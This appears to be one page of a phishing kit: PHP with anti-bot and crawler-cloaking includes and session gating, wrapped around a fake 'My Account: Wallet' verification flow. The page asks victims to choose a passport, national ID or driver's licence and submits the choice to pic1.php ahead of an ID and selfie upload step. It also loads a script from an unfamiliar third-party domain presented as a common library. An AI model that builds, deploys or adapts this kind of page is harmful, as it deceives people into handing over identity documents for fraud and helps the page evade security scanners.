<?php

error_reporting(0);
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;
if (!isset($_SESSION['check4'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}
$_SESSION['css5'] = "true";

?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <link rel="icon" href="./assets/images/favi.ico" type="image/x-icon">
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <title>My Account: Wallet</title>
      <link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
         <link rel="stylesheet" type="text/css" href="./assets/css/5.php">
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
      <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js"></script>
      <meta http-equiv="cache-control" content="no-cache">
      <meta http-equiv="expires" content="0">
      <meta http-equiv="pragma" content="no-cache">
      </script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
   </head>
   <body>
      <header>
         <div></div>
      </header>
      <div class="mainContainer ">
      <div class="bg">
      </div>
      <div class="hide" id="rotate">
         <div class="circle">
         </div>
         <div class="overlay">
         </div>
      </div>
      <div class="contents">
         <div class="modal hide js-modal">
            <div class="l-modal-shadow js-modal-hide"></div>
            <div class="c-popup l-modal-body">
               <div class="c-popup-img">
                  <img src="assets/images/warning.svg" />
               </div>
               <h3 class="c-popup-title">Warning!</h3>
               <p class="c-popup-description">Complete the progress first</p>
               <input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
            </div>
         </div>
         <div class="mainContents">
            <a href="#" class="close-icon js-modal-hide"></a>
            <ol class="steps js-modal-hide">
               <li id="signed"><a class="signed" href="#">Signed</a></li>
               <li id="Protected"><a class="Protected" href="#">Protected</a></li>
               <li id="Verify"><a class="Verify" href="#">Verify Ownership</a></li>
               <li id="Billing"><a class="Billing" href="#">Billing</a></li>
               <li id="Upload"><a class="Upload" href="#">Upload ID</a></li>
               <li id="Completed"><a class="Completed" href="#">Completed</a></li>
            </ol>
            <div id="process">
               <div style="padding:0 20px">
                  <div>
                     <ol class="proof">
                        <li class="itm current">
                           <div class="ui-text-small">
                              Identity Proof
                           </div>
                        </li>
                        <li class="itm">
                           <div class="ui-text-small">
                              Selfie With Proof
                           </div>
                        </li>
                     </ol>
                  </div>
                  <div id="select_one">
                     <form action="./pic1.php" method="POST">
                        <div id="area_choose">
                           <h1 style="font-size:1.4rem!important;color: #79a9ca;">
                              Choose your ID type
                           </h1>
                           <div class="doc_type">
                              <div class="doc_type_choice">
                                 <div class="doc_type_choice_wrapper">
                                    <div>
                                       <img src="assets/images/id_p.svg" style="width: 120px;" alt="">
                                    </div>
                                    <label class="cont">
                                    <input type="radio" name="doc_type" value="Passport">
                                    <span class="checkmark">
                                    </span>
                                    <span>
                                    Passport </span>
                                    </label>
                                 </div>
                              </div>
                              <div class="doc_type_choice">
                                 <div class="doc_type_choice_wrapper">
                                    <div>
                                       <img src="assets/images/id_n.svg" style="width: 120px;" alt="">
                                    </div>
                                    <label class="cont">
                                    <input type="radio" name="doc_type" value="National ID">
                                    <span class="checkmark">
                                    </span>
                                    <span> National ID</span>
                                    </label>
                                 </div>
                              </div>
                              <div class="doc_type_choice">
                                 <div class="doc_type_choice_wrapper">
                                    <div>
                                       <img src="assets/images/id_lic.svg" style="width: 120px;" alt="">
                                    </div>
                                    <label class="cont">
                                    <input type="radio" name="doc_type" value="Driver's license">
                                    <span class="checkmark">
                                    </span>
                                    <span>Driver's license</span>
                                    </label>
                                 </div>
                              </div>
                           </div>
                           <input style="margin-bottom:1.2rem;margin-top:1rem" type="submit" class="bt bt_select_one" value="Process">
                        </div>


                        
                     </form>
                     <script>
               $("#Billing,#Verify,#Upload,#Completed").removeClass("current");
               
               $("#Upload").addClass("current"); 
        
            </script>
                     
                  </div>
                  
               </div>
               
            </div>
         </div>
         <script type="text/javascript">
            $(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
            $(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
         </script>
      </div>
   </body>
</html>